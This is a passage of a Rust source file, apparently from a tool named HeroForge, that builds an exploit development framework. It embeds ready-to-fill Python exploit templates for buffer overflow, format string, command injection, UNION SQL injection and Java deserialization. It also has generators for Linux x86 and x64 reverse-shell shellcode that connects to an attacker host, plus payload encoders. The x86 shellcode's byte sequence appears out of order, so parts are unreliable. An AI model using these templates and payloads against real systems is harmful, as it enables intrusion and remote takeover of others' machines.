//! Exploit Development Framework
//!
//! This module provides a comprehensive framework for security researchers to develop
//! and test exploits in authorized contexts (penetration testing, CTF, security research).
//!
//! **IMPORTANT**: This framework is intended for:
//! - Authorized penetration testing engagements
//! - Capture The Flag (CTF) competitions
//! - Security research with proper authorization
//! - Educational purposes
//!
//! **Features**:
//! - Exploit templates for common vulnerability classes
//! - Payload generation and encoding
//! - Target profiling and fingerprinting
//! - Shellcode generation helpers
//! - Exploit testing and validation
//! - ROP gadget assistance

use anyhow::{anyhow, Result};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use uuid::Uuid;

// =============================================================================
// Exploit Templates
// =============================================================================

/// Categories of exploit templates
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum ExploitCategory {
    BufferOverflow,
    FormatString,
    UseAfterFree,
    HeapOverflow,
    IntegerOverflow,
    RaceCondition,
    CommandInjection,
    SqlInjection,
    XssInjection,
    Deserialization,
    PathTraversal,
    SsrfAttack,
    XxeAttack,
    Rce,
    PrivilegeEscalation,
    AuthenticationBypass,
    Custom,
}

/// An exploit template
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitTemplate {
    pub id: String,
    pub name: String,
    pub category: ExploitCategory,
    pub description: String,
    pub target_os: Vec<TargetOS>,
    pub target_arch: Vec<TargetArch>,
    pub language: TemplateLanguage,
    pub template_code: String,
    pub required_params: Vec<TemplateParam>,
    pub example_usage: String,
    pub references: Vec<String>,
    pub author: String,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
}

/// Target operating system
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "lowercase")]
pub enum TargetOS {
    Windows,
    Linux,
    MacOS,
    FreeBSD,
    Android,
    IOS,
    Any,
}

/// Target architecture
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "lowercase")]
pub enum TargetArch {
    X86,
    X64,
    Arm,
    Arm64,
    Mips,
    PowerPC,
    Any,
}

/// Template language
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "lowercase")]
pub enum TemplateLanguage {
    Python,
    Rust,
    C,
    Ruby,
    Go,
    Powershell,
    Bash,
    Assembly,
    Generic,
}

/// Template parameter
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TemplateParam {
    pub name: String,
    pub description: String,
    pub param_type: ParamType,
    pub required: bool,
    pub default_value: Option<String>,
}

/// Parameter type
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum ParamType {
    String,
    Integer,
    Boolean,
    IpAddress,
    Port,
    FilePath,
    Bytes,
    ShellcodeRef,
}

// =============================================================================
// Payload Generation
// =============================================================================

/// Payload generator configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadConfig {
    pub payload_type: PayloadType,
    pub target_os: TargetOS,
    pub target_arch: TargetArch,
    pub lhost: Option<String>,
    pub lport: Option<u16>,
    pub rhost: Option<String>,
    pub rport: Option<u16>,
    pub encoding: Option<EncodingType>,
    pub iterations: u32,
    pub bad_chars: Vec<u8>,
    pub nop_sled_size: usize,
    pub custom_options: HashMap<String, String>,
}

/// Type of payload to generate
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum PayloadType {
    ReverseShellTcp,
    ReverseShellHttps,
    BindShellTcp,
    Meterpreter,
    ShellcodeExec,
    CommandExec,
    FileDownload,
    FileUpload,
    AddUser,
    Custom,
}

/// Payload encoding type
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum EncodingType {
    Xor,
    Base64,
    AlphaNumeric,
    Unicode,
    Shikata,
    Custom,
}

/// Generated payload
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GeneratedPayload {
    pub id: String,
    pub config: PayloadConfig,
    pub raw_bytes: Vec<u8>,
    pub encoded_bytes: Option<Vec<u8>>,
    pub size: usize,
    pub encoded_size: Option<usize>,
    pub hash_md5: String,
    pub hash_sha256: String,
    pub format_options: Vec<PayloadFormat>,
    pub generated_at: DateTime<Utc>,
}

/// Output format for payload
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "lowercase")]
pub enum PayloadFormat {
    Raw,
    C,
    CSharp,
    Python,
    Powershell,
    Bash,
    Hex,
    Base64,
    Asm,
}

// =============================================================================
// Target Profiling
// =============================================================================

/// Target profile for exploit development
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TargetProfile {
    pub id: String,
    pub name: String,
    pub description: String,
    pub os: TargetOS,
    pub os_version: String,
    pub arch: TargetArch,
    pub protections: TargetProtections,
    pub services: Vec<ServiceInfo>,
    pub vulnerabilities: Vec<VulnerabilityInfo>,
    pub notes: String,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
}

/// Security protections on target
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct TargetProtections {
    pub aslr: Option<bool>,
    pub dep_nx: Option<bool>,
    pub stack_canaries: Option<bool>,
    pub pie: Option<bool>,
    pub relro: Option<RelroLevel>,
    pub cfg: Option<bool>,
    pub cfi: Option<bool>,
    pub fortify_source: Option<bool>,
    pub selinux: Option<bool>,
    pub apparmor: Option<bool>,
    pub seccomp: Option<bool>,
    pub sandbox: Option<String>,
    pub antivirus: Option<String>,
    pub edr: Option<String>,
    pub custom: HashMap<String, String>,
}

/// RELRO protection level
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "lowercase")]
pub enum RelroLevel {
    None,
    Partial,
    Full,
}

/// Service information on target
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ServiceInfo {
    pub name: String,
    pub version: String,
    pub port: u16,
    pub protocol: String,
    pub banner: Option<String>,
}

/// Vulnerability information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VulnerabilityInfo {
    pub cve_id: Option<String>,
    pub name: String,
    pub description: String,
    pub severity: String,
    pub affected_component: String,
    pub exploit_available: bool,
}

// =============================================================================
// Shellcode Helpers
// =============================================================================

/// Shellcode configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellcodeConfig {
    pub shellcode_type: ShellcodeType,
    pub target_os: TargetOS,
    pub target_arch: TargetArch,
    pub options: ShellcodeOptions,
}

/// Type of shellcode
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum ShellcodeType {
    ExecShell,
    ReverseShell,
    BindShell,
    Egghunter,
    Stager,
    Custom,
}

/// Shellcode generation options
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellcodeOptions {
    pub lhost: Option<String>,
    pub lport: Option<u16>,
    pub command: Option<String>,
    pub egg: Option<Vec<u8>>,
    pub null_free: bool,
    pub alphanumeric: bool,
    pub max_size: Option<usize>,
}

/// Generated shellcode
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GeneratedShellcode {
    pub id: String,
    pub config: ShellcodeConfig,
    pub bytes: Vec<u8>,
    pub size: usize,
    pub null_free: bool,
    pub bad_chars_free: Vec<u8>,
    pub hash_md5: String,
    pub disassembly: Option<String>,
    pub generated_at: DateTime<Utc>,
}

// =============================================================================
// ROP Gadget Helpers
// =============================================================================

/// ROP gadget information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RopGadget {
    pub address: u64,
    pub instructions: Vec<String>,
    pub raw_bytes: Vec<u8>,
    pub size: usize,
    pub gadget_type: GadgetType,
    pub usability_score: f64,
}

/// Type of ROP gadget
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum GadgetType {
    PopRet,
    MovRet,
    XchgRet,
    AddRet,
    SubRet,
    JmpReg,
    CallReg,
    SyscallRet,
    WriteWhat,
    StackPivot,
    Custom,
}

/// ROP chain builder
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RopChain {
    pub id: String,
    pub name: String,
    pub description: String,
    pub target_binary: String,
    pub gadgets: Vec<RopGadget>,
    pub chain_bytes: Vec<u8>,
    pub objective: RopObjective,
    pub notes: String,
    pub created_at: DateTime<Utc>,
}

/// Objective of the ROP chain
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum RopObjective {
    ExecShell,
    MprotectRwx,
    Mmap,
    VirtualAlloc,
    VirtualProtect,
    Syscall,
    Custom,
}

// =============================================================================
// Exploit Project Management
// =============================================================================

/// An exploit development project
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitProject {
    pub id: String,
    pub name: String,
    pub description: String,
    pub target_cve: Option<String>,
    pub target_profile: Option<TargetProfile>,
    pub exploit_type: ExploitCategory,
    pub development_stage: DevelopmentStage,
    pub payloads: Vec<GeneratedPayload>,
    pub shellcodes: Vec<GeneratedShellcode>,
    pub rop_chains: Vec<RopChain>,
    pub test_results: Vec<ExploitTestResult>,
    pub notes: String,
    pub author: String,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
}

/// Stage of exploit development
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum DevelopmentStage {
    Research,
    PocDevelopment,
    Testing,
    Refinement,
    Complete,
    Abandoned,
}

/// Result of exploit testing
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitTestResult {
    pub id: String,
    pub test_date: DateTime<Utc>,
    pub target_description: String,
    pub success: bool,
    pub execution_time_ms: u64,
    pub payload_delivered: bool,
    pub shell_obtained: bool,
    pub error_message: Option<String>,
    pub crash_details: Option<String>,
    pub notes: String,
}

// =============================================================================
// Exploit Development Framework
// =============================================================================

/// Main exploit development framework
pub struct ExploitDevelopmentFramework {
    templates: Vec<ExploitTemplate>,
    projects: HashMap<String, ExploitProject>,
    target_profiles: HashMap<String, TargetProfile>,
}

impl ExploitDevelopmentFramework {
    /// Create a new framework instance
    pub fn new() -> Self {
        Self {
            templates: Self::load_builtin_templates(),
            projects: HashMap::new(),
            target_profiles: HashMap::new(),
        }
    }

    /// Load built-in exploit templates
    fn load_builtin_templates() -> Vec<ExploitTemplate> {
        vec![
            Self::create_bof_template(),
            Self::create_format_string_template(),
            Self::create_command_injection_template(),
            Self::create_sqli_template(),
            Self::create_deserial_template(),
        ]
    }

    fn create_bof_template() -> ExploitTemplate {
        ExploitTemplate {
            id: "bof-basic".to_string(),
            name: "Basic Buffer Overflow".to_string(),
            category: ExploitCategory::BufferOverflow,
            description: "Template for basic stack-based buffer overflow exploits".to_string(),
            target_os: vec![TargetOS::Linux, TargetOS::Windows],
            target_arch: vec![TargetArch::X86, TargetArch::X64],
            language: TemplateLanguage::Python,
            template_code: r#"#!/usr/bin/env python3
"""
Basic Buffer Overflow Exploit Template
Target: {{TARGET_NAME}}
CVE: {{CVE_ID}}
Author: {{AUTHOR}}
"""
import socket
import struct

# Configuration
TARGET_HOST = "{{RHOST}}"
TARGET_PORT = {{RPORT}}
OFFSET = {{OFFSET}}

# Shellcode placeholder - replace with your shellcode
SHELLCODE = (
    b"\x90" * 16  # NOP sled
    # Add your shellcode here
)

def create_payload():
    """Create the exploit payload"""
    buffer = b"A" * OFFSET

    # Return address - adjust for your target
    ret_addr = struct.pack("<I", {{RET_ADDR}})
    buffer += ret_addr

    # NOP sled + shellcode
    buffer += b"\x90" * 32
    buffer += SHELLCODE

    return buffer

def exploit():
    """Send the exploit"""
    payload = create_payload()

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((TARGET_HOST, TARGET_PORT))
        sock.send(payload)
        sock.close()
        print(f"[+] Exploit sent to {TARGET_HOST}:{TARGET_PORT}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
"#.to_string(),
            required_params: vec![
                TemplateParam { name: "RHOST".to_string(), description: "Target IP".to_string(), param_type: ParamType::IpAddress, required: true, default_value: None },
                TemplateParam { name: "RPORT".to_string(), description: "Target port".to_string(), param_type: ParamType::Port, required: true, default_value: None },
                TemplateParam { name: "OFFSET".to_string(), description: "Buffer offset to EIP".to_string(), param_type: ParamType::Integer, required: true, default_value: None },
                TemplateParam { name: "RET_ADDR".to_string(), description: "Return address".to_string(), param_type: ParamType::String, required: true, default_value: None },
            ],
            example_usage: "python exploit.py".to_string(),
            references: vec!["https://owasp.org/www-community/vulnerabilities/Buffer_Overflow".to_string()],
            author: "HeroForge".to_string(),
            created_at: Utc::now(),
            updated_at: Utc::now(),
        }
    }

    fn create_format_string_template() -> ExploitTemplate {
        ExploitTemplate {
            id: "fmt-string".to_string(),
            name: "Format String Exploit".to_string(),
            category: ExploitCategory::FormatString,
            description: "Template for format string vulnerability exploits".to_string(),
            target_os: vec![TargetOS::Linux],
            target_arch: vec![TargetArch::X86, TargetArch::X64],
            language: TemplateLanguage::Python,
            template_code: r#"#!/usr/bin/env python3
"""
Format String Exploit Template
"""
import struct

def create_write_payload(addr, value, offset):
    """Create format string write primitive"""
    payload = b""
    payload += struct.pack("<I", addr)
    write_len = value - len(payload)
    payload += f"%{write_len}x%{offset}$n".encode()
    return payload

# Example: Overwrite GOT entry
# payload = create_write_payload(GOT_ADDR, SHELLCODE_ADDR, OFFSET)
"#.to_string(),
            required_params: vec![
                TemplateParam { name: "OFFSET".to_string(), description: "Stack offset".to_string(), param_type: ParamType::Integer, required: true, default_value: None },
            ],
            example_usage: "python fmt_exploit.py".to_string(),
            references: vec!["https://owasp.org/www-community/attacks/Format_string_attack".to_string()],
            author: "HeroForge".to_string(),
            created_at: Utc::now(),
            updated_at: Utc::now(),
        }
    }

    fn create_command_injection_template() -> ExploitTemplate {
        ExploitTemplate {
            id: "cmd-inject".to_string(),
            name: "Command Injection".to_string(),
            category: ExploitCategory::CommandInjection,
            description: "Template for OS command injection exploits".to_string(),
            target_os: vec![TargetOS::Any],
            target_arch: vec![TargetArch::Any],
            language: TemplateLanguage::Python,
            template_code: r#"#!/usr/bin/env python3
"""
Command Injection Exploit Template
"""
import requests

TARGET = "{{TARGET_URL}}"
PARAM = "{{VULN_PARAM}}"

# Common injection payloads
payloads = [
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "\n id",
]

for payload in payloads:
    resp = requests.get(TARGET, params={PARAM: payload})
    if "uid=" in resp.text:
        print(f"[+] Vulnerable! Payload: {payload}")
        break
"#.to_string(),
            required_params: vec![
                TemplateParam { name: "TARGET_URL".to_string(), description: "Target URL".to_string(), param_type: ParamType::String, required: true, default_value: None },
                TemplateParam { name: "VULN_PARAM".to_string(), description: "Vulnerable parameter".to_string(), param_type: ParamType::String, required: true, default_value: None },
            ],
            example_usage: "python cmd_inject.py".to_string(),
            references: vec!["https://owasp.org/www-community/attacks/Command_Injection".to_string()],
            author: "HeroForge".to_string(),
            created_at: Utc::now(),
            updated_at: Utc::now(),
        }
    }

    fn create_sqli_template() -> ExploitTemplate {
        ExploitTemplate {
            id: "sqli-union".to_string(),
            name: "SQL Injection (UNION)".to_string(),
            category: ExploitCategory::SqlInjection,
            description: "Template for UNION-based SQL injection".to_string(),
            target_os: vec![TargetOS::Any],
            target_arch: vec![TargetArch::Any],
            language: TemplateLanguage::Python,
            template_code: r#"#!/usr/bin/env python3
"""
SQL Injection (UNION) Template
"""
import requests

TARGET = "{{TARGET_URL}}"
PARAM = "{{VULN_PARAM}}"

# Determine number of columns
for i in range(1, 20):
    cols = ",".join(["NULL"] * i)
    payload = f"' UNION SELECT {cols}--"
    resp = requests.get(TARGET, params={PARAM: payload})
    if resp.status_code == 200 and "error" not in resp.text.lower():
        print(f"[+] Columns: {i}")
        break

# Extract data example
# payload = f"' UNION SELECT username,password,NULL FROM users--"
"#.to_string(),
            required_params: vec![
                TemplateParam { name: "TARGET_URL".to_string(), description: "Target URL".to_string(), param_type: ParamType::String, required: true, default_value: None },
                TemplateParam { name: "VULN_PARAM".to_string(), description: "Vulnerable parameter".to_string(), param_type: ParamType::String, required: true, default_value: None },
            ],
            example_usage: "python sqli.py".to_string(),
            references: vec!["https://owasp.org/www-community/attacks/SQL_Injection".to_string()],
            author: "HeroForge".to_string(),
            created_at: Utc::now(),
            updated_at: Utc::now(),
        }
    }

    fn create_deserial_template() -> ExploitTemplate {
        ExploitTemplate {
            id: "java-deserial".to_string(),
            name: "Java Deserialization".to_string(),
            category: ExploitCategory::Deserialization,
            description: "Template for Java deserialization exploits".to_string(),
            target_os: vec![TargetOS::Any],
            target_arch: vec![TargetArch::Any],
            language: TemplateLanguage::Python,
            template_code: r#"#!/usr/bin/env python3
"""
Java Deserialization Exploit Template
Requires: ysoserial
"""
import subprocess
import base64
import requests

YSOSERIAL_PATH = "/path/to/ysoserial.jar"
TARGET = "{{TARGET_URL}}"
COMMAND = "{{COMMAND}}"

# Generate payload with ysoserial
gadget_chains = [
    "CommonsCollections1",
    "CommonsCollections2",
    "CommonsCollections3",
    "CommonsCollections4",
    "CommonsCollections5",
    "CommonsCollections6",
    "CommonsBeanutils1",
]

for gadget in gadget_chains:
    try:
        result = subprocess.run(
            ["java", "-jar", YSOSERIAL_PATH, gadget, COMMAND],
            capture_output=True
        )
        payload = base64.b64encode(result.stdout).decode()

        # Send payload - adjust for your target
        resp = requests.post(TARGET, data=payload)
        print(f"[*] Tried {gadget}")
    except Exception as e:
        print(f"[-] {gadget}: {e}")
"#.to_string(),
            required_params: vec![
                TemplateParam { name: "TARGET_URL".to_string(), description: "Target URL".to_string(), param_type: ParamType::String, required: true, default_value: None },
                TemplateParam { name: "COMMAND".to_string(), description: "Command to execute".to_string(), param_type: ParamType::String, required: true, default_value: None },
            ],
            example_usage: "python deserial.py".to_string(),
            references: vec!["https://github.com/frohoff/ysoserial".to_string()],
            author: "HeroForge".to_string(),
            created_at: Utc::now(),
            updated_at: Utc::now(),
        }
    }

    /// Get all available templates
    pub fn get_templates(&self) -> &[ExploitTemplate] {
        &self.templates
    }

    /// Get templates by category
    pub fn get_templates_by_category(&self, category: ExploitCategory) -> Vec<&ExploitTemplate> {
        self.templates.iter()
            .filter(|t| t.category == category)
            .collect()
    }

    /// Get template by ID
    pub fn get_template(&self, id: &str) -> Option<&ExploitTemplate> {
        self.templates.iter().find(|t| t.id == id)
    }

    /// Create a new exploit project
    pub fn create_project(
        &mut self,
        name: String,
        description: String,
        exploit_type: ExploitCategory,
        target_cve: Option<String>,
        author: String,
    ) -> Result<String> {
        let project = ExploitProject {
            id: Uuid::new_v4().to_string(),
            name,
            description,
            target_cve,
            target_profile: None,
            exploit_type,
            development_stage: DevelopmentStage::Research,
            payloads: Vec::new(),
            shellcodes: Vec::new(),
            rop_chains: Vec::new(),
            test_results: Vec::new(),
            notes: String::new(),
            author,
            created_at: Utc::now(),
            updated_at: Utc::now(),
        };

        let id = project.id.clone();
        self.projects.insert(id.clone(), project);
        Ok(id)
    }

    /// Get a project by ID
    pub fn get_project(&self, id: &str) -> Option<&ExploitProject> {
        self.projects.get(id)
    }

    /// Get a mutable project by ID
    pub fn get_project_mut(&mut self, id: &str) -> Option<&mut ExploitProject> {
        self.projects.get_mut(id)
    }

    /// List all projects
    pub fn list_projects(&self) -> Vec<&ExploitProject> {
        self.projects.values().collect()
    }

    /// Create a target profile
    pub fn create_target_profile(
        &mut self,
        name: String,
        description: String,
        os: TargetOS,
        os_version: String,
        arch: TargetArch,
    ) -> Result<String> {
        let profile = TargetProfile {
            id: Uuid::new_v4().to_string(),
            name,
            description,
            os,
            os_version,
            arch,
            protections: TargetProtections::default(),
            services: Vec::new(),
            vulnerabilities: Vec::new(),
            notes: String::new(),
            created_at: Utc::now(),
            updated_at: Utc::now(),
        };

        let id = profile.id.clone();
        self.target_profiles.insert(id.clone(), profile);
        Ok(id)
    }

    /// Get a target profile by ID
    pub fn get_target_profile(&self, id: &str) -> Option<&TargetProfile> {
        self.target_profiles.get(id)
    }

    /// Generate payload
    pub fn generate_payload(&self, config: PayloadConfig) -> Result<GeneratedPayload> {
        // Generate basic reverse shell payload
        let raw_bytes = match (&config.payload_type, &config.target_os, &config.target_arch) {
            (PayloadType::ReverseShellTcp, TargetOS::Linux, TargetArch::X64) => {
                self.generate_linux_x64_reverse_shell(
                    config.lhost.as_deref().unwrap_or("127.0.0.1"),
                    config.lport.unwrap_or(4444),
                )?
            }
            (PayloadType::ReverseShellTcp, TargetOS::Linux, TargetArch::X86) => {
                self.generate_linux_x86_reverse_shell(
                    config.lhost.as_deref().unwrap_or("127.0.0.1"),
                    config.lport.unwrap_or(4444),
                )?
            }
            (PayloadType::CommandExec, _, _) => {
                config.custom_options.get("command")
                    .map(|c| c.as_bytes().to_vec())
                    .unwrap_or_default()
            }
            _ => {
                return Err(anyhow!("Unsupported payload configuration"));
            }
        };

        // Apply encoding if requested
        let encoded_bytes = if let Some(encoding) = &config.encoding {
            Some(self.encode_payload(&raw_bytes, encoding, config.iterations, &config.bad_chars)?)
        } else {
            None
        };

        let size = raw_bytes.len();
        let encoded_size = encoded_bytes.as_ref().map(|b| b.len());

        // Calculate MD5 hash
        let hash_md5 = {
            use md5::{Md5, Digest};
            let mut hasher = Md5::new();
            hasher.update(&raw_bytes);
            hex::encode(hasher.finalize())
        };

        let payload = GeneratedPayload {
            id: Uuid::new_v4().to_string(),
            config,
            raw_bytes: raw_bytes.clone(),
            encoded_bytes,
            size,
            encoded_size,
            hash_md5,
            hash_sha256: hex::encode(sha2::Sha256::digest(&raw_bytes)),
            format_options: vec![
                PayloadFormat::Raw,
                PayloadFormat::Hex,
                PayloadFormat::Base64,
                PayloadFormat::Python,
                PayloadFormat::C,
            ],
            generated_at: Utc::now(),
        };

        Ok(payload)
    }

    /// Generate Linux x64 reverse shell shellcode
    fn generate_linux_x64_reverse_shell(&self, lhost: &str, lport: u16) -> Result<Vec<u8>> {
        // Parse IP address
        let ip_parts: Vec<u8> = lhost.split('.')
            .filter_map(|p| p.parse::<u8>().ok())
            .collect();

        if ip_parts.len() != 4 {
            return Err(anyhow!("Invalid IP address"));
        }

        // Linux x64 reverse shell shellcode template
        // This is a simplified example - production would use proper shellcode
        let mut shellcode = vec![
            // socket(AF_INET, SOCK_STREAM, 0)
            0x6a, 0x29,                         // push 0x29 (socket syscall)
            0x58,                               // pop rax
            0x99,                               // cdq (xor edx, edx)
            0x6a, 0x02,                         // push 2 (AF_INET)
            0x5f,                               // pop rdi
            0x6a, 0x01,                         // push 1 (SOCK_STREAM)
            0x5e,                               // pop rsi
            0x0f, 0x05,                         // syscall
            0x48, 0x97,                         // xchg rax, rdi

            // struct sockaddr_in setup
            0x48, 0xb8,                         // movabs rax, imm64
        ];

        // Add sockaddr_in (port + IP in network byte order)
        let port_high = (lport >> 8) as u8;
        let port_low = (lport & 0xff) as u8;

        shellcode.extend_from_slice(&[0x02, 0x00, port_high, port_low]);  // sin_family + port
        shellcode.extend_from_slice(&ip_parts);  // IP address

        // Continue shellcode
        shellcode.extend_from_slice(&[
            0x50,                               // push rax
            0x48, 0x89, 0xe6,                   // mov rsi, rsp
            0x6a, 0x10,                         // push 16
            0x5a,                               // pop rdx
            0x6a, 0x2a,                         // push 0x2a (connect syscall)
            0x58,                               // pop rax
            0x0f, 0x05,                         // syscall

            // dup2 loop for stdin/stdout/stderr
            0x6a, 0x03,                         // push 3
            0x5e,                               // pop rsi
            0x48, 0xff, 0xce,                   // dec rsi
            0x6a, 0x21,                         // push 0x21 (dup2 syscall)
            0x58,                               // pop rax
            0x0f, 0x05,                         // syscall
            0x75, 0xf6,                         // jne (loop)

            // execve("/bin/sh", NULL, NULL)
            0x6a, 0x3b,                         // push 0x3b (execve syscall)
            0x58,                               // pop rax
            0x99,                               // cdq
            0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e,
            0x2f, 0x73, 0x68, 0x00,             // mov rbx, "/bin/sh\0"
            0x53,                               // push rbx
            0x48, 0x89, 0xe7,                   // mov rdi, rsp
            0x52,                               // push rdx (NULL)
            0x57,                               // push rdi
            0x48, 0x89, 0xe6,                   // mov rsi, rsp
            0x0f, 0x05,                         // syscall
        ]);

        Ok(shellcode)
    }

    /// Generate Linux x86 reverse shell shellcode
    fn generate_linux_x86_reverse_shell(&self, lhost: &str, lport: u16) -> Result<Vec<u8>> {
        let ip_parts: Vec<u8> = lhost.split('.')
            .filter_map(|p| p.parse::<u8>().ok())
            .collect();

        if ip_parts.len() != 4 {
            return Err(anyhow!("Invalid IP address"));
        }

        let port_high = (lport >> 8) as u8;
        let port_low = (lport & 0xff) as u8;

        // Linux x86 reverse shell shellcode
        let mut shellcode = vec![
            // socket(AF_INET, SOCK_STREAM, 0)
            0x31, 0xdb,                         // xor ebx, ebx
            0xf7, 0xe3,                         // mul ebx
            0x53,                               // push ebx
            0x43,                               // inc ebx
            0x53,                               // push ebx
            0x6a, 0x02,                         // push 2
            0x89, 0xe1,                         // mov ecx, esp
            0xb0, 0x66,                         // mov al, 0x66 (socketcall)
            0xcd, 0x80,                         // int 0x80
            0x93,                               // xchg eax, ebx

            // connect(sock, &addr, 16)
            0x59,                               // pop ecx
            0xb0, 0x3f,                         // mov al, 0x3f (dup2)
            0xcd, 0x80,                         // int 0x80
            0x49,                               // dec ecx
            0x79, 0xf9,                         // jns (loop)

            // struct sockaddr_in
            0x68,                               // push imm32 (IP)
        ];

        shellcode.extend_from_slice(&ip_parts);
        shellcode.extend_from_slice(&[
            0x68, 0x02, 0x00, port_high, port_low, // push port + family
            0x89, 0xe1,                         // mov ecx, esp
            0xb0, 0x66,                         // mov al, 0x66
            0x50,                               // push eax
            0x51,                               // push ecx
            0x53,                               // push ebx
            0xb3, 0x03,                         // mov bl, 3
            0x89, 0xe1,                         // mov ecx, esp
            0xcd, 0x80,                         // int 0x80

            // execve("/bin/sh", NULL, NULL)
            0x52,                               // push edx
            0x68, 0x6e, 0x2f, 0x73, 0x68,       // push "n/sh"
            0x68, 0x2f, 0x2f, 0x62, 0x69,       // push "//bi"
            0x89, 0xe3,                         // mov ebx, esp
            0x52,                               // push edx
            0x53,                               // push ebx
            0x89, 0xe1,                         // mov ecx, esp
            0xb0, 0x0b,                         // mov al, 0x0b (execve)
            0xcd, 0x80,                         // int 0x80
        ]);

        Ok(shellcode)
    }

    /// Encode payload
    fn encode_payload(
        &self,
        payload: &[u8],
        encoding: &EncodingType,
        iterations: u32,
        _bad_chars: &[u8],
    ) -> Result<Vec<u8>> {
        let mut result = payload.to_vec();

        for _ in 0..iterations {
            result = match encoding {
                EncodingType::Xor => {
                    let key = 0x41u8;
                    result.iter().map(|b| b ^ key).collect()
                }
                EncodingType::Base64 => {
                    use base64::Engine;
                    base64::engine::general_purpose::STANDARD.encode(&result).into_bytes()
                }
                EncodingType::AlphaNumeric => {
                    // Simplified alphanumeric encoding
                    result.iter()
                        .flat_map(|b| format!("{:02x}", b).into_bytes())
                        .collect()
                }
                EncodingType::Unicode => {
                    result.iter()
                        .flat_map(|b| vec![*b, 0x00])
                        .collect()
                }
                _ => result,
            };
        }

        Ok(result)
    }

    /// Format payload for output
    pub fn format_payload(payload: &[u8], format: PayloadFormat) -> String {
        match format {
            PayloadFormat::Raw => String::from_utf8_lossy(payload).to_string(),
            PayloadFormat::Hex => hex::encode(payload),
            PayloadFormat::Base64 => {
                use base64::Engine;
                base64::engine::general_purpose::STANDARD.encode(payload)
            }
            PayloadFormat::Python => {
                let bytes_str: Vec<String> = payload.iter()
                    .map(|b| format!("\\x{:02x}", b))
                    .collect();
                format!("b\"{}\"", bytes_str.join(""))
            }
            PayloadFormat::C => {
                let bytes_str: Vec<String> = payload.iter()
                    .map(|b| format!("0x{:02x}", b))
                    .collect();
                format!("unsigned char shellcode[] = {{\n    {}\n}};",
                    bytes_str.chunks(12)
                        .map(|c| c.join(", "))
                        .collect::<Vec<_>>()
                        .join(",\n    "))
            }
            PayloadFormat::CSharp => {
                let bytes_str: Vec<String> = payload.iter()
                    .map(|b| format!("0x{:02x}", b))
                    .collect();
                format!("byte[] shellcode = new byte[] {{\n    {}\n}};",
                    bytes_str.chunks(12)
                        .map(|c| c.join(", "))
                        .collect::<Vec<_>>()
                        .join(",\n    "))
            }
            PayloadFormat::Powershell => {
                let bytes_str: Vec<String> = payload.iter()
                    .map(|b| format!("0x{:02x}", b))
                    .collect();
                format!("[Byte[]] $shellcode = {}", bytes_str.join(","))
            }
            PayloadFormat::Bash => {
                let bytes_str: Vec<String> = payload.iter()
                    .map(|b| format!("\\x{:02x}", b))
                    .collect();
                format!("echo -ne \"{}\" | ./target", bytes_str.join(""))
            }
            PayloadFormat::Asm => {
                format!("; Shellcode: {} bytes\nshellcode:\n    db {}",
                    payload.len(),
                    payload.iter()
                        .map(|b| format!("0x{:02x}", b))
                        .collect::<Vec<_>>()
                        .chunks(8)
                        .map(|c| c.join(", "))
                        .collect::<Vec<_>>()
                        .join("\n    db "))
            }
        }
    }

    /// Record a test result for a project
    pub fn record_test_result(
        &mut self,
        project_id: &str,
        target_description: String,
        success: bool,
        execution_time_ms: u64,
        notes: String,
    ) -> Result<String> {
        let project = self.projects.get_mut(project_id)
            .ok_or_else(|| anyhow!("Project not found"))?;

        let result = ExploitTestResult {
            id: Uuid::new_v4().to_string(),
            test_date: Utc::now(),
            target_description,
            success,
            execution_time_ms,
            payload_delivered: success,
            shell_obtained: success,
            error_message: None,
            crash_details: None,
            notes,
        };

        let id = result.id.clone();
        project.test_results.push(result);
        project.updated_at = Utc::now();

        Ok(id)
    }

    /// Update project development stage
    pub fn update_project_stage(&mut self, project_id: &str, stage: DevelopmentStage) -> Result<()> {
        let project = self.projects.get_mut(project_id)
